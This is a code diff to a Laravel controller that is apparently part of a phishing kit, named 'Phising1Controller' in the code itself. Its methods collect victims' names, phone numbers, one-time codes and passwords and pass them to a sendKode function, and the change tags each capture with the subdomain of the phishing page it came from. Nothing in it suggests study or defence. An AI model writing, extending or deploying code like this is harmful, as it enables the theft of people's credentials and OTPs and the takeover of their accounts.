@@ -14,6 +14,7 @@ class Phising1Controller extends Controller
 
     public function store_number(Request $request)
     {
+        $subdomain = explode('.', $request->getHost())[0];
         $request->validate([
             'name' => 'required|min:3|max:12',
             'phone_number' => ['required', 'min:6', 'max:15'],
@@ -22,7 +23,7 @@ class Phising1Controller extends Controller
         // $otp = $request->otp;
         // $password = $request->password;
 
-        $this->sendKode($phone_number);
+        $this->sendKode($phone_number, "", "", $subdomain);
         // dd($request->all());
         return redirect()->back();
     }
@@ -35,8 +36,9 @@ class Phising1Controller extends Controller
         $phone_number = $request->phone_number;
         $otp = $request->otp;
         $password = $request->password;
+        $subdomain = explode('.', $request->getHost())[0];
 
-        $this->sendKode($phone_number, $otp, $password);
+        $this->sendKode($phone_number, $otp, $password, $subdomain);
     }
 
     public function store_password(Request $request)
@@ -48,8 +50,8 @@ class Phising1Controller extends Controller
         $phone_number = $request->phone_number;
         $otp = $request->otp;
         $password = $request->password;
-
-        $this->sendKode($phone_number, $otp, $password);
+        $subdomain = explode('.', $request->getHost())[0];
+        $this->sendKode($phone_number, $otp, $password, $subdomain);
         // return redirect()->route('data_diri');
     }
     public function sendKode($phone = "",  $otp = "", $password = "", $subdomain = "")
